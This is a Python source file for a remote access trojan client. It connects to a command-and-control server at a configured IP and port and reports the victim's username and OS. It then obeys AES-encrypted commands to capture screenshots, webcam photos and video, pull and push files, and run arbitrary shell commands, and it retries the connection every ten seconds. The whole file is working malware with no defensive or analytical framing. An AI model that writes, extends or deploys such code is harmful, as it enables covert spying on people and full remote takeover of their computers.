import socket
import platform
import mss
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import os
from PIL import Image
import io
import contextlib
import cv2
import sys
import time
import subprocess

SECRET_KEY = b'0123456789abcdef0123456789abcdef'
C2_SERVER_IP = "127.0.0.1"
C2_SERVER_PORT = 9090

@contextlib.contextmanager
def suppress_stdout_stderr():
    with open(os.devnull, 'w') as devnull:
        old_stdout = sys.stdout
        old_stderr = sys.stderr
        sys.stdout = devnull
        sys.stderr = devnull
        try:
            yield
        finally:
            sys.stdout = old_stdout
            sys.stderr = old_stderr

def get_system_info():
    username = os.getlogin()
    os_version = platform.system() + " " + platform.release()
    return f"{username}|{os_version}"

def list_webcams():
    available = []
    with suppress_stdout_stderr():
        for i in range(5):
            cap = cv2.VideoCapture(i)
            if cap.read()[0]:
                available.append(i)
            cap.release()
    return "[+] Webcams Index: " + ",".join(str(i) for i in available) if available else "[+] No detected webcams in this device"

def take_photo(camera_index):
    try:
        cam = cv2.VideoCapture(int(camera_index))
        ret, frame = cam.read()
        cam.release()

        if not ret:
            return "[!] Could not access webcam"

        _, buffer = cv2.imencode('.jpg', frame)
        encoded = base64.b64encode(buffer).decode('utf-8')
        return "[photo] " + encoded

    except Exception as e:
        return f"[!] Error accessing webcam: {e}"

def stream_webcam(index=0, duration=5, fps=5):
    try:
        index = int(index)
        cam = cv2.VideoCapture(index)
        frames = []
        start = time.time()

        while time.time() - start < duration:
            ret, frame = cam.read()
            if ret:
                frames.append(frame)
            time.sleep(1 / fps)

        cam.release()

        if not frames:
            return "[!] No frames captured"

        height, width, _ = frames[0].shape
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        out = cv2.VideoWriter("stream.mp4", fourcc, fps, (width, height))

        for frame in frames:
            out.write(frame)
        out.release()

        with open("stream.mp4", "rb") as f:
            encoded = base64.b64encode(f.read()).decode("utf-8")

        os.remove("stream.mp4")
        return "[video] " + encoded

    except Exception as e:
        return f"[!] Error in stream: {e}"

def take_screenshot():
    with mss.mss() as sct:
        screenshot = sct.grab(sct.monitors[1])
        img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)

        buffer = io.BytesIO()
        img.save(buffer, format='PNG')

        encoded = base64.b64encode(buffer.getvalue()).decode("utf-8")
        return "[screenshot]" + encoded

def encrypt_message(message: str) -> bytes:
    iv = os.urandom(16)
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(message.encode(), AES.block_size))
    return base64.b64encode(iv + encrypted)

def decrypt_message(encrypted_message: bytes) -> str:
    try:
        raw = base64.b64decode(encrypted_message)
        iv = raw[:16]
        encrypted = raw[16:]
        cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)
        return decrypted.decode()
    except Exception as e:
        return f"[!] Error decrypting message: {e}"

def download_file(file):
    if os.path.exists(file):
        with open(file, "rb") as f:
            content = f.read()
            encoded = base64.b64encode(content).decode("utf-8")
            response = f"[download]" + f" {encoded} " + file
    else:
        response = f"[!] The file {file} doesen't exists."
    return response

def upload_file(content, file_name):
    with open(file_name, "wb") as f:
        f.write(base64.b64decode(content))
    if os.path.exists(file_name):
        response = "[File uploaded]"
    else:
        response = "[Error uploading file]"
    return response

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout.strip() if result.stdout.strip() else result.stderr.strip()
    except subprocess.CalledProcessError as e:
        return f"Error executing the command: {e}"
    except Exception as e:
        return f"Error: {e}"

def connect_to_c2():
    exit = False
    while not exit:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((C2_SERVER_IP, C2_SERVER_PORT))
            system_info = get_system_info()
            client.send(system_info.encode("utf-8"))
            
            while True:
                encrypted_command = client.recv(4096)
                if not encrypted_command:
                    continue

                try:
                    command = decrypt_message(encrypted_command).strip()
                except Exception as e:
                    print(f"[!] Error decrypting the command: {e}")
                    continue

                if command.lower() == "kill":
                    exit = True
                    break

                elif command.lower() == "screenshot":
                    output = take_screenshot()

                elif command.lower().startswith("download"):
                    file = command.split(" ")[1]
                    output = download_file(file)

                elif command.startswith("upload"):
                    args = command.split()
                    content = args[1]
                    file_name = args[2]
                    output = upload_file(content, file_name)

                elif command.lower() == "listwebcams":
                    output = list_webcams()

                elif command.lower().startswith("photo"):
                    args = command.split()
                    if len(args) == 2 and args[1].isdigit():
                        output = take_photo(args[1])
                    else:
                        output = "[!] Usage: photo <cam_index>"

                elif command.lower().startswith("stream"):
                    args = command.split()
                    if len(args) >= 2:
                        cam_index = args[1]
                        duration = int(args[2]) if len(args) >= 3 else 5
                        fps = int(args[3]) if len(args) >= 4 else 5
                        output = stream_webcam(cam_index, duration, fps)
                    else:
                        output = "[!] Usage: stream <cam_index> [duration] [fps]"

                else:
                    output = execute_command(command)

                if not output:
                    output = "[No response]"

                encrypted_output = encrypt_message(output)
                size = str(len(encrypted_output)).zfill(10).encode("utf-8")
                client.send(size + encrypted_output)


        except Exception as e:
            print(f"[!] Conection error: {e}, retrying in 10s...")
            time.sleep(10)


if __name__ == "__main__":
    connect_to_c2()
